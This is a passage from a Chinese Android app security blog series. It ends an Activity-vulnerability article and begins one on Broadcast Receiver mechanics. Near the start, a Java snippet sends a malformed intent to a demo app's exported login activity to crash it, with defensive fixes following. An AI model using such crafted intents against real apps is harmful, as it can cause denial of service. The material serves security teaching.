class=\"variable\">comp</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ComponentName</span>(<span class=\"string\">&quot;com.mwr.example.sieve&quot;</span>,<span class=\"string\">&quot;com.mwr.example.sieve.MainLoginActivity&quot;</span>);</span><br><span class=\"line\">intent.putExtra(<span class=\"string\">&quot;&quot;</span>, <span class=\"string\">&quot;&quot;</span>);</span><br><span class=\"line\">intent.setComponent(comp);</span><br><span class=\"line\">startActivity(intent);</span><br></pre></td></tr></table></figure>\n\n<p>这里我们传入一个空字符，使其产生错误</p>\n<p>当然我们还可以使用我们的神器drozer来进行攻击</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0009/20.png\" alt=\"image-20210905193503857\"></p>\n<p>远程拒绝服务攻击：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">参考网址： http:<span class=\"comment\">//rui0.cn/archives/30</span></span><br></pre></td></tr></table></figure>\n\n<p>还有其他类型的拒绝服务攻击，大家可以参考博客：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">参考网址https:<span class=\"comment\">//blog.csdn.net/myboyer/article/details/44940811utm_term=Activity%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1&amp;utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~sobaiduweb~default-1-44940811&amp;spm=3001.4430</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（3）安全防护-1\"><a href=\"#（3）安全防护-1\" class=\"headerlink\" title=\"（3）安全防护\"></a>（3）安全防护</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">安全防护：</span><br><span class=\"line\">\t（<span class=\"number\">1</span>）空指针异常、类型转换异常、数组越界访问异常、类未定义异常、其它异常</span><br><span class=\"line\">\t（<span class=\"number\">2</span>）谨慎处理接收的intent以及其携带的信息，对接收到的任何数据做<span class=\"keyword\">try</span>/<span class=\"keyword\">catch</span>处理，以及对不符合预期数据做异常处理</span><br><span class=\"line\">总结：</span><br><span class=\"line\"><span class=\"number\">1.</span>不需要被外部调用的activity设置android:exported=<span class=\"string\">&quot;false&quot;</span>；</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">2.</span>若需要外部调用，需自定义signature或者signatureOrSystem级别的权限；</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">3.</span>注册的组件请严格校验输入参数，注意空值判定和类型转换判断\t</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"四、实验总结\"><a href=\"#四、实验总结\" class=\"headerlink\" title=\"四、实验总结\"></a>四、实验总结</h2><p>写到这里，这个帖子总算写完了，对Android的Activity漏洞挖掘的总结过程中，我又再一次将Android 的Activity组件运行的基本原理熟悉了一遍，学习就是不断的总结提高把，可能在编写的过程中，还存在很多不足地方，就请各位大佬指教了。</p>\n<h2 id=\"五、参考网址\"><a href=\"#五、参考网址\" class=\"headerlink\" title=\"五、参考网址\"></a>五、参考网址</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Android 第一行代码</span><br><span class=\"line\">https:<span class=\"comment\">//www.jianshu.com/p/b999119d2752</span></span><br><span class=\"line\">https:<span class=\"comment\">//blog.csdn.net/zhangxunxyy/article/details/80805394</span></span><br><span class=\"line\">https:<span class=\"comment\">//github.com/jaredrummler/AndroidProcesses</span></span><br><span class=\"line\">https:<span class=\"comment\">//jaredrummler.com/2017/09/13/android-processes/</span></span><br><span class=\"line\">https:<span class=\"comment\">//www.itranslater.com/qa/details/2325835735628252160</span></span><br><span class=\"line\">https:<span class=\"comment\">//blog.csdn.net/daydayplayphone/article/details/52236148</span></span><br><span class=\"line\">https:<span class=\"comment\">//github.com/Chainfire/libsuperuser</span></span><br><span class=\"line\">https:<span class=\"comment\">//blog.csdn.net/brycegao321/article/details/76966424</span></span><br><span class=\"line\">https:<span class=\"comment\">//blog.csdn.net/dq1005/article/details/51453121</span></span><br><span class=\"line\">https:<span class=\"comment\">//www.jianshu.com/p/f3aea648dfbb</span></span><br><span class=\"line\">https:<span class=\"comment\">//blog.csdn.net/weixin_39352694/article/details/83620517</span></span><br><span class=\"line\">https:<span class=\"comment\">//github.com/wenmingvs/AndroidProcess</span></span><br><span class=\"line\">https:<span class=\"comment\">//blog.csdn.net/ruingman/article/details/51146152</span></span><br><span class=\"line\">http:<span class=\"comment\">//blog.chinaunix.net/uid-16728139-id-4962659.html</span></span><br><span class=\"line\"> http:<span class=\"comment\">//rui0.cn/archives/30</span></span><br></pre></td></tr></table></figure>\n\n","categories":["Android APP漏洞之战"],"tags":["漏洞挖掘","工具"]},{"title":"Android App漏洞之战（11）——Broadcast Recevier漏洞详解","url":"/2023/02/13/bug0011/","content":"<h2 id=\"一、前言\"><a href=\"#一、前言\" class=\"headerlink\" title=\"一、前言\"></a>一、前言</h2><p>今天继续总结Android APP漏洞四大组件中Broadcast Recevier漏洞挖掘的知识，主要分为两个部分，一部分对Android 广播机制原理作一个初步的总结，另一部分便是对Android 广播机制常见的一些漏洞进行总结，主要是介绍一些已存在的典型漏洞，部分知识可以参考前两篇帖子<a href=\"https://bbs.pediy.com/thread-269255.htm\">Android APP漏洞之战（2）——Service漏洞挖掘详解</a>和<a href=\"https://bbs.pediy.com/thread-269211.htm\">Android APP漏洞之战（1）——Activity漏洞挖掘详解</a>。</p>\n<span id=\"more\"></span>\n<h2 id=\"二、Broadcast-Recevier初步介绍\"><a href=\"#二、Broadcast-Recevier初步介绍\" class=\"headerlink\" title=\"二、Broadcast Recevier初步介绍\"></a>二、Broadcast Recevier初步介绍</h2><h3 id=\"1-Broadcast-Recevier的基本原理\"><a href=\"#1-Broadcast-Recevier的基本原理\" class=\"headerlink\" title=\"1.Broadcast Recevier的基本原理\"></a>1.Broadcast Recevier的基本原理</h3><h3 id=\"（1）广播机制简介\"><a href=\"#（1）广播机制简介\" class=\"headerlink\" title=\"（1）广播机制简介\"></a>（1）广播机制简介</h3><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Android中的每个应用程序都可以对自己感兴趣的广播进行注册，这样该程序只会收到自己所关心的广播内容，这些广播可以是来自系统的，也可能是来自其他程序的。Android提供了一套完整的API,允许应用程序自由地发送和接收广播。</span><br><span class=\"line\">   广播机制分为两个方面：广播发送者和广播接收者，一般来说，BroadcastReceiver就是广播接收者。     </span><br></pre></td></tr></table></figure>\n\n<h3 id=\"（2）广播机制应用场景\"><a href=\"#（2）广播机制应用场景\" class=\"headerlink\" title=\"（2）广播机制应用场景\"></a>（2）广播机制应用场景</h3><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">（<span class=\"number\">1</span>）Android内不同组件间的通信（应用/不同应用之间）</span><br><span class=\"line\">（<span class=\"number\">2</span>）多线程通信</span><br><span class=\"line\">（<span class=\"number\">3</span>）与Android系统在特定情况下的通信</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"（3）广播机制模型理解\"><a href=\"#（3）广播机制模型理解\" class=\"headerlink\" title=\"（3）广播机制模型理解\"></a>（3）广播机制模型理解</h3><p>Android的广播机制使用了设计模式中的观察者模式：基于消息的发布&#x2F;订阅事件模型，<code>从设计模式上讲，广播的发送者和接收者极大程度的**解耦**，使得系统方便集成，容易扩展</code>。</p>\n<p>模型中的3个基本角色：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">（<span class=\"number\">1</span>）消息订阅者（广播接收者）</span><br><span class=\"line\">（<span class=\"number\">2</span>）消息发布者（广播发布者）</span><br><span class=\"line\">（<span class=\"number\">3</span>）消息中心（AMS,即Activity Manager Service）</span><br></pre></td></tr></table></figure>\n\n<p>模型的具体原理如下图所示：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0011/1.png\"></p>\n<h3 id=\"（4）广播机制的使用流程\"><a href=\"#（4）广播机制的使用流程\" class=\"headerlink\" title=\"（4）广播机制的使用流程\"></a>（4）广播机制的使用流程</h3><p>我们先通过一个流程图来具体的理解广播机制的运行原理：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0011/2.png\" alt=\"image-20210912150855995\"></p>\n<p>具体的操作流程：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">（<span class=\"number\">1</span>）首先开发人员自定义广播接收者BroadcastReceiver，并重写onRecvice()方法，在里面可以实现具体操作，然后到消息中心AMS注册</span><br><span class=\"line\">（<span class=\"number\">2</span>）广播发送者定义并向AMS发送广播</span><br><span class=\"line\">（<span class=\"number\">3</span>）AMS查找符合相应条件（IntentFilter/Permission等）的BroadcastReceiver</span><br><span class=\"line\">（<span class=\"number\">4</span>）AMS将广播发送到上述符合条件的BroadcastReceiver相应的消息循环队列中</span><br><span class=\"line\">（<span class=\"number\">5</span>）BroadcastReceiver通过消息循环执行拿到此广播，回调BroadcastReceiver中的onReceive()方法。</span><br></pre></td></tr></table></figure>\n\n<p>我们可以按照流程图具体一步步来实现广播机制：</p>\n<p><strong>&lt;1&gt;自定义广播接收者BroadcastReceiver：</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 继承BroadcastReceivre类</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">mBroadcastReceiver</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">BroadcastReceiver</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 复写onReceive()方法</span></span><br><span class=\"line\">  <span class=\"comment\">// 接收到广播后，则自动调用该方法</span></span><br><span class=\"line\">  <span class=\"meta\">@Override</span></span><br><span class=\"line\">  <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onReceive</span><span class=\"params\">(Context context, Intent intent)</span> &#123;</span><br><span class=\"line\">   <span class=\"comment\">//写入接收广播后的操作</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">操作步骤：</span><br><span class=\"line\">（<span class=\"number\">1</span>）继承BroadcastReceivre基类</span><br><span class=\"line\">（<span class=\"number\">2</span>）必须复写抽象方法onReceive()方法</span><br><span class=\"line\">\t广播接收器接收到相应广播后，会自动回调 onReceive() 方法，一般情况下，onReceive方法会涉及 与 其他组件之间的交互，如发送Notification、启动Service等，默认情况下，广播接收器运行在 UI 线程，因此，onReceive()方法不能执行耗时操作，否则将导致ANR</span><br></pre></td></tr></table></figure>\n\n<p><strong>&lt;2&gt;广播接收者注册：</strong></p>\n<p>注册的方式分为两种：静态注册、动态注册</p>\n<p><strong>静态注册：</strong></p>\n<p>注册方式：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">在AndroidManifest.xml里通过&lt;receive&gt;标签声明</span><br></pre></td></tr></table></figure>\n\n<p>属性说明：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">receiver</span> </span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">android:enabled</span>=<span class=\"string\">[</span>&quot;<span class=\"attr\">true</span>&quot; | &quot;<span class=\"attr\">false</span>&quot;]</span></span><br><span class=\"line\"><span class=\"tag\">//<span class=\"attr\">此broadcastReceiver能否接收其他App的发出的广播</span></span></span><br><span class=\"line\"><span class=\"tag\">//<span class=\"attr\">默认值是由receiver中有无intent-filter决定的</span>：<span class=\"attr\">如果有intent-filter</span>，<span class=\"attr\">默认值为true</span>，<span class=\"attr\">否则为false</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">android:exported</span>=<span class=\"string\">[</span>&quot;<span class=\"attr\">true</span>&quot; | &quot;<span class=\"attr\">false</span>&quot;]</span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">android:icon</span>=<span class=\"string\">&quot;drawable resource&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">android:label</span>=<span class=\"string\">&quot;string resource&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">//<span class=\"attr\">继承BroadcastReceiver子类的类名</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;.mBroadcastReceiver&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">//<span class=\"attr\">具有相应权限的广播发送者发送的广播才能被此BroadcastReceiver所接收</span>；</span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">android:permission</span>=<span class=\"string\">&quot;string&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">//<span class=\"attr\">BroadcastReceiver运行所处的进程</span></span></span><br><span class=\"line\"><span class=\"tag\">//<span class=\"attr\">默认为app的进程</span>，<span class=\"attr\">可以指定独立的进程</span></span></span><br><span class=\"line\"><span class=\"tag\">//<span class=\"attr\">注</span>：<span class=\"attr\">Android四大基本组件都可以通过此属性指定自己的独立进程</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">android:process</span>=<span class=\"string\">&quot;string&quot;</span> &gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">//用于指定此广播接收器将接收的广播类型</span><br><span class=\"line\">//本示例中给出的是用于接收网络状态改变时发出的广播</span><br><span class=\"line\"> <span class=\"tag\">&lt;<span class=\"name\">intent-filter</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">action</span> <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;android.net.conn.CONNECTIVITY_CHANGE&quot;</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">intent-filter</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">receiver</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>具体实例：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">receiver</span> </span></span><br><span class=\"line\"><span class=\"tag\">    //<span class=\"attr\">此广播接收者类是mBroadcastReceiver</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;.mBroadcastReceiver&quot;</span> &gt;</span></span><br><span class=\"line\">    //用于接收网络状态改变时发出的广播</span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">intent-filter</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">action</span> <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;android.net.conn.CONNECTIVITY_CHANGE&quot;</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">intent-filter</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">receiver</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>我们完成静态注册后，当App首次启动时，系统会自动实例化mBroadcastReceiver类，并注册到系统中</p>\n<p><strong>动态注册：</strong></p>\n<p>注册方式：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">动态注册需要在功能代码中进行注册</span><br></pre></td></tr></table></figure>\n\n<p>具体实例：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0011/4.png\" alt=\"image-20210912150855995\"></p>\n<p>具体实现步骤：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">（<span class=\"number\">1</span>）实例化自定义的广播接收者，我们实现广播的功能，可以继承BroadcastReceiver类，并重写类中的方法</span><br><span class=\"line\">（<span class=\"number\">2</span>）实例化意图过滤器，并设置要过滤的广播类型</span><br><span class=\"line\">（<span class=\"number\">3</span>）使用Context的registerReceiver(BroadcastReceiver,IntentFilter)方法注册广播</span><br><span class=\"line\">（<span class=\"number\">4</span>）在onDestory()方法中通过调用unregisterReceiver()方法来实现取消注册</span><br></pre></td></tr></table></figure>\n\n<p>注意事项：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">注意：动态广播最好在Activity的onResume()注册、onPause()注销</span><br><span class=\"line\">原因：</span><br><span class=\"line\">\t<span class=\"number\">1.</span>对于动态广播，有注册就必然得有注销，否则会导致内存泄露</span><br><span class=\"line\">\t<span class=\"number\">2.</span>Activity生命周期如下都是成对出现的 onCreate() &amp; onDestory()、onStart() &amp; onStop()、onResume() &amp; onPause()</span><br><span class=\"line\"></span><br><span class=\"line\">在onResume()注册、onPause()注销是因为onPause()在App死亡前一定会被执行，从而保证广播在App死亡前一定会被注销，从而防止内存泄露。</span><br><span class=\"line\">（<span class=\"number\">1</span>）不在onCreate() &amp; onDestory() 或 onStart() &amp; onStop()注册、注销是因为：当系统因为内存不足（优先级更高的应用需要内存，请看上图红框）要回收Activity占用的资源时，Activity在执行完onPause()方法后就会被销毁，有些生命周期方法onStop()，onDestory()就不会执行。当再回到此Activity时，是从onCreate方法开始执行。</span><br><span class=\"line\">（<span class=\"number\">2</span>）假设我们将广播的注销放在onStop()，onDestory()方法里的话，有可能在Activity被销毁后还未执行onStop()，onDestory()方法，即广播仍还未注销，从而导致内存泄露。</span><br><span class=\"line\">（<span class=\"number\">3</span>）但是，onPause()一定会被执行，从而保证了广播在App死亡前一定会被注销，从而防止内存泄露。</span><br></pre></td></tr></table></figure>\n\n<p><strong>两种注册方式的对比：</strong></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0011/5.png\" alt=\"image-20210912150855995\"></p>\n<p>这里我们就完成了广播接收者的基本工作</p>\n<p><strong>&lt;3&gt;广播发送者定义和发送广播：</strong></p>\n<p><strong>广播的发送：</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">（<span class=\"number\">1</span>）广播 是 用意图（Intent）标识</span><br><span class=\"line\">（<span class=\"number\">2</span>）定义广播的本质 = 定义广播所具备的“意图（Intent）</span><br><span class=\"line\">（<span class=\"number\">3</span>）广播发送 = 广播发送者 将此广播的“意图（Intent）”通过sendBroadcast（）方法发送出去</span><br></pre></td></tr></table></figure>\n\n<p><strong>广播的类型：</strong></p>\n<p>第一种分类：</p>\n<p>广播接收器一般可以分为两种类型：标准广播和有序广播</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">标准广播：一种完全异步执行的广播，广播发出之后，所有的广播接收器都会在同一时刻接收这条广播信息，广播效率比较高，同时是无法截断的。</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0011/6.png\" alt=\"image-20210912150855995\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">有序广播：是一种同步执行的广播，在广播发出之后，同一时刻会有一个广播接收器能收到这条广播消息，当这个广播接收器中逻辑执行完毕后，广播才会继续传递。</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0011/7.png\" alt=\"image-20210912150855995\"></p>\n<p>第二种分类：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">广播的类型主要分为<span class=\"number\">5</span>类：</span><br><span class=\"line\">\t（<span class=\"number\">1</span>）普通广播</span><br><span class=\"line\">\t（<span class=\"number\">2</span>）系统广播</span><br><span class=\"line\">\t（<span class=\"number\">3</span>）有序广播</span><br><span class=\"line\">\t（<span class=\"number\">4</span>）粘性广播</span><br><span class=\"line\">\t（<span class=\"number\">5</span>）App应用内广播</span><br></pre></td></tr></table></figure>\n\n<p><strong>普通广播：</strong></p>\n<p>开发者自身定义intent的广播（最常用），发送广播使用如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">Intent</span> <span class=\"variable\">intent</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Intent</span>();</span><br><span class=\"line\"><span class=\"comment\">//对应BroadcastReceiver中intentFilter的action</span></span><br><span class=\"line\">intent.setAction(<span class=\"string\">&quot;BROADCAST_ACTION&quot;</span>);</span><br><span class=\"line\"><span class=\"comment\">//发送广播</span></span><br><span class=\"line\">sendBroadcast(intent);</span><br></pre></td></tr></table></figure>\n\n<p>若被注册了的广播接收者中注册时intentFilter的action与上述匹配，则会接收此广播（即进行回调onReceive()）,如下mBroadcastReceiver则会接收上述广播</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">receiver</span> </span></span><br><span class=\"line\"><span class=\"tag\">    //<span class=\"attr\">此广播接收者类是mBroadcastReceiver</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;.mBroadcastReceiver&quot;</span> &gt;</span></span><br><span class=\"line\">    //用于接收网络状态改变时发出的广播</span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">intent-filter</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">action</span> <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;BROADCAST_ACTION&quot;</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">intent-filter</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">receiver</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>如果发送的广播有对应权限，那么广播接收者也需要对应权限</p>\n<p><strong>系统广播：</strong></p>\n<p>Android中内置了多个系统广播：只要涉及到手机的基本操作（如开机、网络状态变化、拍照等），都会发送相应的广播每个广播都有特定的Intent-Filter(包括具体的action)，Android系统广播action如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">系统操作\taction</span><br><span class=\"line\">监听网络变化\tandroid.net.conn.CONNECTIVITY_CHANGE</span><br><span class=\"line\">关闭或打开飞行模式\tIntent.ACTION_AIRPLANE_MODE_CHANGED</span><br><span class=\"line\">充电时或电量发生变化\tIntent.ACTION_BATTERY_CHANGED</span><br><span class=\"line\">电池电量低\tIntent.ACTION_BATTERY_LOW</span><br><span class=\"line\">电池电量充足（即从电量低变化到饱满时会发出广播\tIntent.ACTION_BATTERY_OKAY</span><br><span class=\"line\">系统启动完成后(仅广播一次)\tIntent.ACTION_BOOT_COMPLETED</span><br><span class=\"line\">按下照相时的拍照按键(硬件按键)时\tIntent.ACTION_CAMERA_BUTTON</span><br><span class=\"line\">屏幕锁屏\tIntent.ACTION_CLOSE_SYSTEM_DIALOGS</span><br><span class=\"line\">设备当前设置被改变时(界面语言、设备方向等)\tIntent.ACTION_CONFIGURATION_CHANGED</span><br><span class=\"line\">插入耳机时\tIntent.ACTION_HEADSET_PLUG</span><br><span class=\"line\">未正确移除SD卡但已取出来时(正确移除方法:设置--SD卡和设备内存--卸载SD卡)\tIntent.ACTION_MEDIA_BAD_REMOVAL</span><br><span class=\"line\">插入外部储存装置（如SD卡）\tIntent.ACTION_MEDIA_CHECKING</span><br><span class=\"line\">成功安装APK\tIntent.ACTION_PACKAGE_ADDED</span><br><span class=\"line\">成功删除APK\tIntent.ACTION_PACKAGE_REMOVED</span><br><span class=\"line\">重启设备\tIntent.ACTION_REBOOT</span><br><span class=\"line\">屏幕被关闭\tIntent.ACTION_SCREEN_OFF</span><br><span class=\"line\">屏幕被打开\tIntent.ACTION_SCREEN_ON</span><br><span class=\"line\">关闭系统时\tIntent.ACTION_SHUTDOWN</span><br><span class=\"line\">重启设备\tIntent.ACTION_REBOOT</span><br><span class=\"line\">注：当使用系统广播是，只需要在注册广播接收者时定义相关的action即可，并不需要手动发送广播，当系统有相关操作时会自动进行系统广播</span><br></pre></td></tr></table></figure>\n\n<p><strong>有序广播：</strong></p>\n<p>发送出去的广播被广播接收者按照先后顺序接收 有序是针对广播接收者而言的。广播接收者接收广播的顺序规则（同时面向静态和动态注册的广播接收者）：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">（1）按照Priority属性值从大-小排序</span><br><span class=\"line\">（2）Priority属性相同者，动态注册的广播优先</span><br></pre></td></tr></table></figure>\n\n<p>特点：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">（<span class=\"number\">1</span>）接收广播按顺序接收</span><br><span class=\"line\">（<span class=\"number\">2</span>）先接收的广播接收者可以对广播进行截断，即后接收的广播接收者不在接收此广播，可以使用abortBroadcast()方法</span><br><span class=\"line\">（<span class=\"number\">3</span>）先接收的广播接收者可以对广播进行修改，那么后接收的广播接收者将接收到被修改后的广播</span><br></pre></td></tr></table></figure>\n\n<p>具体使用：有序广播的使用过程与普通广播非常类似，差异仅在于广播的发送方式</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">sendOrderedBroadcast(intent,<span class=\"literal\">null</span>); <span class=\"comment\">//参数1：接收的Intent 参数2：与权限相关字符串，一般为null</span></span><br></pre></td></tr></table></figure>\n\n<p><strong>App应用内广播（Local Broadcast）：本地广播</strong></p>\n<p>产生的原因：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">由于Android中的广播可以跨App直接通信（exported对于有intent-filter情况下默认值为<span class=\"literal\">true</span>）</span><br><span class=\"line\">导致可能会出现的问题：</span><br><span class=\"line\">\t（<span class=\"number\">1</span>）其他App针对性发出与当前App intent-filter相匹配的广播，由此导致当前App不断接收广播并处理</span><br><span class=\"line\">\t（<span class=\"number\">2</span>）其他App注册与当前App一致的intent-filter用于接收广播，获取广播的具体星系，会出现安全性和效率性问题</span><br><span class=\"line\">解决方案：</span><br><span class=\"line\">使用App应用内广播（Local Broadcast）</span><br><span class=\"line\">\t(<span class=\"number\">1</span>)App应用内广播壳理解为一种局部广播，广播的发送者和接收者都同属于一个App</span><br><span class=\"line\">\t(<span class=\"number\">2</span>)相比于全局广播（普通广播），App应用内广播优势体现在：安全性高和效率高</span><br></pre></td></tr></table></figure>\n\n<p>实现步骤：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">方法<span class=\"number\">1</span>：</span><br><span class=\"line\">将全局广播设置为局部广播</span><br><span class=\"line\">（<span class=\"number\">1</span>）注册广播是将exported属性设置为<span class=\"literal\">false</span>，使得非本App内部发出的此广播不被接收</span><br><span class=\"line\">（<span class=\"number\">2</span>）在广播的发送和接收时，增设相应权限permission，用于权限验证</span><br><span class=\"line\">（<span class=\"number\">3</span>）发送广播时指定该广播接收器所在的包名，此广播将只会发送到此包中的App内与之相匹配的有效广播接收器中</span><br><span class=\"line\">通过intent.setPackage(packageName)指定包名</span><br><span class=\"line\"></span><br><span class=\"line\">方法<span class=\"number\">2</span>：</span><br><span class=\"line\">\t使用封装好的LocalBroadcastManager类使用方式上与全局广播几乎相同，只是注册/取消注册广播接收器和发送广播时将参数context变成LocalBroadcastManager的单一实例。</span><br><span class=\"line\">注意：对于LocalBroadcastManager方式发送的应用内广播，只能通过LocalBroadcastManager动态注册，不能静态注册</span><br></pre></td></tr></table></figure>\n\n<p>方法2的具体实现：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//注册应用内广播接收器</span></span><br><span class=\"line\"><span class=\"comment\">//步骤1：实例化BroadcastReceiver子类 &amp; IntentFilter mBroadcastReceiver </span></span><br><span class=\"line\">mBroadcastReceiver = <span class=\"keyword\">new</span> <span class=\"title class_\">mBroadcastReceiver</span>(); </span><br><span class=\"line\"><span class=\"type\">IntentFilter</span> <span class=\"variable\">intentFilter</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">IntentFilter</span>(); </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//步骤2：实例化LocalBroadcastManager的实例</span></span><br><span class=\"line\">localBroadcastManager = LocalBroadcastManager.getInstance(<span class=\"built_in\">this</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//步骤3：设置接收广播的类型 </span></span><br><span class=\"line\">intentFilter.addAction(android.net.conn.CONNECTIVITY_CHANGE);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//步骤4：调用LocalBroadcastManager单一实例的registerReceiver（）方法进行动态注册 </span></span><br><span class=\"line\">localBroadcastManager.registerReceiver(mBroadcastReceiver, intentFilter);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//取消注册应用内广播接收器</span></span><br><span class=\"line\">localBroadcastManager.unregisterReceiver(mBroadcastReceiver);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//发送应用内广播</span></span><br><span class=\"line\"><span class=\"type\">Intent</span> <span class=\"variable\">intent</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Intent</span>();</span><br><span class=\"line\">intent.setAction(BROADCAST_ACTION);</span><br><span class=\"line\">localBroadcastManager.sendBroadcast(intent);</span><br></pre></td></tr></table></figure>\n\n<p>这里我们就完成了开发人员手动完成部分，就成功实现了Android的广播机制，后续就是系统自动完成了</p>\n<p>最后我们关注一些不同注册方式的广播接收器回调onReceive()中的context返回值</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">对于静态注册（全局+应用内广播），回调onReceive(context,intent)中的context返回值是：ReceiverRestrictedContext</span><br><span class=\"line\">对于全局广播的动态注册，回调onReceive(context, intent)中的context返回值是：Activity Context；</span><br><span 